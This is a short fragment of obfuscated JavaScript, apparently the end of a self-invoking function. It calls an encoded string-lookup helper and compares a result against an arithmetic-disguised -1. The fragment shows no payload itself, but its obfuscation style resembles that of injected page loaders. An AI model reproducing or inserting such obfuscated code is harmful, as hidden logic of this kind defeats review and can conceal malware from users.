b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};